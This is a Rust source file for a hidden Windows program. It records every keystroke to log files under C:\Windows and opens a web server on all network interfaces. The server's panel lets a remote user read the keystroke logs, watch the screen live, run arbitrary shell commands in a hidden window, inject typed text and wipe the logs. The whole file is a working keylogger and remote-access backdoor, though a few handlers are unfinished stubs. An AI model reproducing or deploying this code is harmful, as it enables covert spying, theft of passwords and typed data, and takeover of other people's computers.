#![windows_subsystem = "windows"]

use axum::{
    Form, Router,
    extract::ws::{Message, WebSocketUpgrade},
    response::Html,
    routing::{get, post},
};
use device_query::{DeviceEvents, DeviceEventsHandler};
use enigo::{Enigo, Keyboard, Settings};
use rdev::listen;
use serde::Deserialize;
use std::{
    env::args,
    io::Cursor,
    sync::{Arc, Mutex},
    time::Duration,
};
use std::fs::OpenOptions;
use std::io::{Read, Seek, SeekFrom, Write};
use tokio::{net::TcpListener, process::Command, spawn};
use xcap::{Monitor, image::ImageFormat};

#[derive(Deserialize)]
struct Frm {
    choice: String,
    text: String,
}

#[tokio::main]
async fn main() {
    let mut arg = args();
    arg.next();

    let lock = Arc::new(Mutex::new(OpenOptions::new().read(true).write(true).create(true).open("C:\\Windows\\full.log").unwrap()));
    let lock1 = lock.clone();
    let lock2 = lock.clone();
    let lock3 = lock.clone();

    let lck = Arc::new(Mutex::new(OpenOptions::new().read(true).write(true).create(true).open("C:\\Windows\\opt.log").unwrap()));
    let lck1 = lck.clone();
    let lck2 = lck.clone();

    let handler = DeviceEventsHandler::new(Duration::ZERO).unwrap();
    let enigo = Arc::new(Mutex::new(Enigo::new(&Settings::default()).unwrap()));

    let _down = handler.on_key_down(move |key| {
        let mut f = lock2.lock().unwrap();
        f.seek(SeekFrom::End(0)).unwrap();
        f.write((key.to_string() + "&#x2193; ").as_bytes()).unwrap();
    });
    let _up = handler.on_key_up(move |key| {
        let mut f = lock3.lock().unwrap();
        f.seek(SeekFrom::End(0)).unwrap();
        f.write((key.to_string() + "&#x2191; ").as_bytes()).unwrap();
    });

    spawn(async move {
        loop {
            let l = lck2.clone();
            listen(move |e| {
                if let Some(name) = e.name {
                    let mut f = l.lock().unwrap();
                    f.seek(SeekFrom::End(0)).unwrap();
                    f.write(match &name[..] {
                        "&" => "&amp;",
                        "<" => "&lt;",
                        others => others,
                    }.as_bytes()).unwrap();
                }
            })
            .unwrap();
        }
    });

    axum::serve(
        TcpListener::bind("0.0.0.0:".to_string() + &arg.next().unwrap_or("1145".to_string()))
            .await
            .unwrap(),
        Router::new()
            .route(
                "/",
                post(async move |Form(Frm { choice, text })| {
                    match &choice[..] {
                        "cmd" => {
                            Command::new("cmd")
                                .creation_flags(0x08000000)
                                .arg("/c")
                                .arg(&text)
                                .spawn()
                                .unwrap();
                        }
                        "code" => (), // TODO: code
                        "eni" => (),  // TODO: enigo
                        "rdev" => (), // TODO: rdev
                        "txt" => enigo.lock().unwrap().text(&text).unwrap(),
                        "clr" => {
                            let mut f = lock.lock().unwrap();
                            let mut g = lck.lock().unwrap();
                            f.set_len(0).unwrap();
                            g.set_len(0).unwrap();
                            f.seek(SeekFrom::Start(0)).unwrap();
                            g.seek(SeekFrom::Start(0)).unwrap();

                        }
                        _ => (),
                    }
                    Html("<script>window.location.href=''</script>")
                })
                .get(async move || {
                    let mut f = lock1.lock().unwrap();
                    let mut g = lck1.lock().unwrap();
                    f.seek(SeekFrom::Start(0)).unwrap();
                    g.seek(SeekFrom::Start(0)).unwrap();
                    let mut s = String::new();
                    let mut t = String::new();
                    f.read_to_string(&mut s).unwrap();
                    g.read_to_string(&mut t).unwrap();
                    Html(
                        "<!DOCTYPE html><html><body><form action='/'method='post'><select name='choice'><option value='cmd'>cmd</option><option value='code'>key</option><option value='eni'>enigo</option><option value='rdev'>rdev</option><option value='txt'>input</option><option value='clr'>clear</option></select><input name='text'/><input type='submit'/></form><pre style='white-space:pre-wrap;'>"
                            .to_string() + &s + "<hr>" + &t
                        + "</pre><img src='screen.bmp'/><script>const ws=new WebSocket('screen.bmp');const img=document.querySelector('img');ws.onmessage=(e)=>{if(e.data instanceof Blob)img.src=URL.createObjectURL(event.data)}</script></body></html>",
                    )
                }),
            )
            .route(
                "/screen.bmp",
                get(async |ws: WebSocketUpgrade| {
                    ws.on_upgrade(async |mut sk| loop {
                        let mut buf = Cursor::new(Vec::new());
                        Monitor::all().unwrap()[0]
                            .capture_image()
                            .unwrap()
                            .write_to(&mut buf, ImageFormat::Bmp)
                            .unwrap();
                        sk.send(Message::from(buf.into_inner())).await.unwrap();
                    })
                }),
            ),
    )
    .await
    .unwrap();
}
